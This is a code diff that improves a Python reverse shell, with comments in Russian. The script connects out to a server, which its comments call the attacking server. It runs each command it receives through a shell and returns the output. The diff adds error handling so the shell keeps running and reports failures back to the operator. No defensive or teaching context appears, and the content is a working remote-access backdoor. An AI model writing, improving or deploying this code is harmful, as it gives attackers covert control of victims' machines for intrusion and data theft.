@@ -9,11 +9,21 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((server_ip, server_port))
 
 while True:
-    command = s.recv(1024).decode('utf-8')  # Получаем команду от атакующего сервера
-    if command.lower() == 'exit':
-        break
-    if command:
-        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        s.send(output.stdout + output.stderr)  # Отправляем результат выполнения команды обратно
+    try:
+        command = s.recv(1024).decode('utf-8')  # Получаем команду от атакующего сервера
+        if command.lower() == 'exit':
+            break
+        if command:
+            # Обрабатываем команду и получаем вывод
+            result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+
+            # Возвращаем вывод или ошибку
+            output = result.stdout + result.stderr
+            if not output:
+                output = b'No output or error message.'
+
+            s.send(output)  # Отправляем результат выполнения команды обратно
+    except Exception as e:
+        s.send(f"Error: {str(e)}".encode())  # Отправляем сообщение об ошибке, если она произошла
 
 s.close()
